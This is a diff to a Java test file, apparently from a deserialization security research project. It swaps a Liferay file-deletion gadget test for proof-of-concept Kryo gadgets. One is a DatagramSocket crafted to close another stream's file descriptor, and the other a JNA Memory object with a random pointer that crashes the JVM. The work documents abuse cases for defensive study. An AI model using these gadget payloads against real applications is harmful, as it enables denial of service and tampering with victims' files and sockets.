@@ -2,12 +2,13 @@ package com.contrastsecurity.serialbox;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileDescriptor;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.net.URL;
-import java.net.URLClassLoader;
+import java.net.DatagramSocket;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -15,7 +16,9 @@ import java.util.List;
 import junit.framework.TestCase;
 
 import org.apache.commons.io.FileUtils;
+import org.apache.commons.lang.math.RandomUtils;
 import org.jpedal.io.ObjectStore;
+import org.junit.Ignore;
 import org.junit.Test;
 
 import refutils.util.FieldHelper;
@@ -23,12 +26,17 @@ import refutils.util.FieldHelper;
 import com.esotericsoftware.kryo.Kryo;
 import com.esotericsoftware.kryo.io.Input;
 import com.esotericsoftware.kryo.io.Output;
+import com.sun.jna.Memory;
 
 /**
  * This test case affirms abuse cases for the following gadgets:
  * 
+ * java.net.PlainDatagramSocketImpl - packaged with the JRE, and can be used to close any open file or socket
  * org.jpedal.io.ObjectStore - packaged with ColdFusion 10, and can be used to delete any file
- * com.liferay.portal.util.FileMultiValueMap - packaged with Liferay, and can be used to delete any file
+ * com.sun.jna.Memory - packaged with lots of stuff, like Vert.X
+ * 
+ * These test cases should be run with HotSpot Java 8. Exploiting other JVMs may be require slight
+ * modifications to the malicious objects created herein.
  */
 public class KryoTest extends TestCase {
 	
@@ -36,20 +44,15 @@ public class KryoTest extends TestCase {
 	private ByteArrayOutputStream baos;
 	private Output out;
 	private Input in;
-	private boolean addedLiferayJars;
 	
 	@Override
 	protected void setUp() throws Exception {
 		kryo = new Kryo();
 		baos = new ByteArrayOutputStream();
 		out = new Output(baos);
-		
-		if(!addedLiferayJars) {
-			addLiferayJars();
-			addedLiferayJars = true;
-		}
 	}
 	
+	@SuppressWarnings("unchecked")
 	@Test
 	public void testGenericCollectionStuffing() throws Exception {
 		List<String> listOfStrings = new ArrayList<String>();
@@ -66,26 +69,6 @@ public class KryoTest extends TestCase {
 		assertEquals("i", rebuiltList.get(0));
 		assertEquals("stuffed", rebuiltList.get(1));
 		assertFalse(rebuiltList.get(2) instanceof String);
-	}
-
-	/**
-	 * We add these libraries manually from source repositories
-	 * instead of from a dependency resolver because some of them
-	 * are from the app, and not available in maven, and because
-	 * we are sure these are the versions compatible to Liferay.
-	 * 
-	 * This is all for setting up a unit test -- the target app 
-	 * would have all of these on the classpath already.
-	 */
-	private void addLiferayJars() throws IOException {
-		addToClassloader("lib/portal-service.jar");
-		addToClassloader("lib/portal-impl.jar");
-		addToClassloader("lib/util-java.jar");
-		addToClassloader("lib/easyconf.jar");
-		addToClassloader("lib/commons-collections.jar");
-		addToClassloader("lib/commons-configuration.jar");
-		addToClassloader("lib/commons-beanutils.jar");
-		addToClassloader("lib/commons-digester.jar");
 	}
 	
 	@SuppressWarnings({ "rawtypes", "unchecked" })
@@ -135,123 +118,115 @@ public class KryoTest extends TestCase {
 		 */
 		assertFalse(new File(targetFile).exists());
 	}
-
-	private void callFinalize(Object obj) throws Exception {
-		Class<?> objClass = obj.getClass();
+	
+	private void callFinalize(Object obj, Class<?> objClass) throws Exception {
 		Method finalize = objClass.getDeclaredMethod("finalize", new Class[]{});
 		finalize.setAccessible(true);
 		finalize.invoke(obj, new Object[]{});
 	}
 
-	@Test
-	public void testLiferay_FileMultiValueMap() throws Exception {
-		
-		/*
-		 * Write the test file to disk. This could easily be a firewall rules
-		 * file, /etc/passwd, or something else hilarious.
-		 */
-		String targetFilePrefix = "target/liferayFileToDelete";
-		String targetFile = targetFilePrefix + ".properties";
-		FileUtils.write(new File(targetFile), "this fill will be deleted by FileMultiValueMap#finalize()");
-		
-		/*
-		 * Make sure our file exists.
-		 */
-		assertTrue(new File(targetFile).exists());
-		
-		/*
-		 * Setup Liferay classes. This obviously won't need to happen in a 
-		 * target's environment.
-		 */
-		setupLiferayEnvironment();
-		
-		/*
-		 * Make the malicious FileMultiValueMap.
-		 */
-		Class<?> mapClass = Class.forName("com.liferay.portal.util.FileMultiValueMap");
-		Object/*com.liferay.portal.util.FileMultiValueMap*/ map = mapClass.newInstance();
-		FieldHelper mapHelper = new FieldHelper(map);
-		mapHelper.setValue("_fileName", targetFilePrefix);
-		callFinalize(map);
-		
-		/*
-		 * Make sure the malicious file's finalize() deleted the target file.
-		 */
-		assertFalse(new File(targetFile).exists());
+	private void callFinalize(Object obj) throws Exception {
+		Class<?> objClass = obj.getClass();
+		callFinalize(obj, objClass);
 	}
 	
-	/**
-	 * We have to setup a bunch of stuff that will already be present in Liferay environments.
-	 */
-    private void setupLiferayEnvironment() throws Exception {
-    	/*
-		 * Setup temp file singletons.
-		 */
-		Object/*FileImpl*/ fileImpl = getStatic("com.liferay.portal.util.FileImpl", "getInstance");
-		Class<?> fileUtilClass = Class.forName("com.liferay.portal.kernel.util.FileUtil");
-		Field singletonField = fileUtilClass.getDeclaredField("_file");
-		singletonField.setAccessible(true);
-		singletonField.set(null, fileImpl);
+	@SuppressWarnings("resource")
+	@Test
+	public void testDatagramSocket() throws Throwable {
+		File targetFile = new File("target/fd.txt");
+		FileUtils.write(targetFile, "this is a test");
+		
+		FileInputStream fis = new FileInputStream(targetFile);
+		assertTrue(fis.read() != -1);
+		
+		FieldHelper fdHelper = new FieldHelper(fis.getFD());
+		
+		int fd = (Integer) fdHelper.getValue("fd");
+		
+		DatagramSocket socket = new DatagramSocket();
+		FieldHelper socketHelper = new FieldHelper(socket);
+		Object/*java.net.DatagramSocketImpl*/ impl = socketHelper.getValue("impl");
+		
+		Constructor<?> constr = FileDescriptor.class.getDeclaredConstructor(int.class);
+		constr.setAccessible(true);
+		FileDescriptor maliciousFd = (FileDescriptor) constr.newInstance(fd);
+		
+		Class<?> superclass = impl.getClass().getSuperclass().getSuperclass();
+		Field fdField = superclass.getDeclaredField("fd");
+		fdField.setAccessible(true);
+		fdField.set(impl, maliciousFd);
 		
 		/*
-		 * Setup date singleton.
+		 * Write out a malicious DatagramSocket to be read in by
+		 * the victim app. We've changed its file descriptor to
+		 * be the file descriptor of the FileInputStream above.
+		 * 
+		 * Once this malicious DatagramSocket gets garbage collected
+		 * the FileInputStream should fail, since its link to the
+		 * underlying OS and file system has been killed.
 		 */
-		Object/*FileImpl*/ dateFactoryUtilImpl = Class.forName("com.liferay.portal.util.FastDateFormatFactoryImpl").newInstance();
-		Class<?> dateFactoryUtilClass = Class.forName("com.liferay.portal.kernel.util.FastDateFormatFactoryUtil");
-		singletonField = dateFactoryUtilClass.getDeclaredField("_fastDateFormatFactory");
-		singletonField.setAccessible(true);
-		singletonField.set(null, dateFactoryUtilImpl);
+		kryo.writeObject(out, socket);
 		
 		/*
-		 * Setup DB singleton.
+		 * Reconstruct the malicious socket, then call finalize() on it
+		 * like the victim application will.
 		 */
-		Object/*FileImpl*/ dbFactoryImpl = Class.forName("com.liferay.portal.dao.db.DBFactoryImpl").newInstance();
-		Class<?> dbFactoryClass = Class.forName("com.liferay.portal.kernel.dao.db.DBFactoryUtil");
-		singletonField = dbFactoryClass.getDeclaredField("_dbFactory");
-		singletonField.setAccessible(true);
-		singletonField.set(null, dbFactoryImpl);
+		in = new Input(out.toBytes());
+		DatagramSocket rebuiltSocket = kryo.readObject(in, DatagramSocket.class);
+		Field implField = rebuiltSocket.getClass().getDeclaredField("impl");
+		implField.setAccessible(true);
+		Object/*DatagramSocketImpl*/ socketImpl = implField.get(rebuiltSocket);
+		callFinalize(socketImpl, socketImpl.getClass().getSuperclass());
 		
-		Class<?>/*HypersonicDB*/ dbClass = Class.forName("com.liferay.portal.dao.db.HypersonicDB");
-		Constructor<?> dbConstr = dbClass.getDeclaredConstructors()[0];
-		dbConstr.setAccessible(true);
-		Object/*HypersonicDB*/ db = dbConstr.newInstance();
-		Field dbField = dbFactoryImpl.getClass().getDeclaredField("_db");
-		dbField.setAccessible(true);
-		dbField.set(dbFactoryImpl, db);
+		try {
+			fis.read();
+			fail("The file descriptor should have been closed, and an IOException (Bad file descriptor) should have been returned");
+		} catch(IOException e) {
+			// this is expected
+		}
 	}
-
-	private Object getStatic(String className, String methodName) throws Exception {
-		Class<?> cls = Class.forName(className);
-		Method method = cls.getDeclaredMethod(methodName);
-		return method.invoke(null, new Object[0]);
+	
+	@Test
+	@Ignore
+	private void testAtomicInteger() throws Exception {
+		/*
+		 * Create a 1-byte buffer from malloc().
+		 */
+		Memory mem = new Memory(1);
+		mem.setByte(0, (byte) 0x01);
+		assertEquals(0x01, mem.getByte(0));
+		
+		/*
+		 * Confirm that the protections around this API are in place.
+		 */
+		try {
+			mem.getByte(5);
+			fail("Shouldn't be able to access value outside of 1-byte buffer");
+		} catch (IndexOutOfBoundsException e) { }
+		
+		/*
+		 * Set the hidden member of this field that points to the memory address
+		 * where the buffer is supposed to be allocated to some random address.
+		 */
+		FieldHelper memHelper = new FieldHelper(mem);
+		memHelper.setValue("peer", RandomUtils.nextLong());
+		
+		/*
+		 * Serialize the now-malicious value to be read in by the target app. 
+		 */
+		kryo.writeObject(out, mem);
+		
+		/*
+		 * Deserialize the malicious value.
+		 */
+		in = new Input(out.toBytes());
+		Memory rebuiltMem = kryo.readObject(in, Memory.class);
+		
+		/*
+		 * This call will crash the JVM entirely, unless your random() call
+		 * accidentally landed on a previously allocated buffer. Not likely.
+		 */
+		callFinalize(rebuiltMem);
 	}
-
-	public static void addToClassloader(String s) throws IOException
-    {
-        File f = new File(s);
-        addToClassloader(f);
-    }
-
-    public static void addToClassloader(File f) throws IOException
-    {
-    	addToClassloader(f.toURI().toURL());
-    }
-
-    protected static void addToClassloader(URL u) throws IOException
-    {
-        URLClassLoader sysloader = (URLClassLoader) ClassLoader.getSystemClassLoader();
-        Class<?> sysclass = URLClassLoader.class;
-
-        try {
-            Method method = sysclass.getDeclaredMethod("addURL", ADDURL_PARAMS);
-            method.setAccessible(true);
-            method.invoke(sysloader, new Object[] {u});
-        } catch (Throwable t) {
-            t.printStackTrace();
-            throw new IOException("Error, could not add URL to system classloader");
-        }
-
-    }
-    
-    private static final Class<?>[] ADDURL_PARAMS = new Class[] {URL.class};
+	
 }
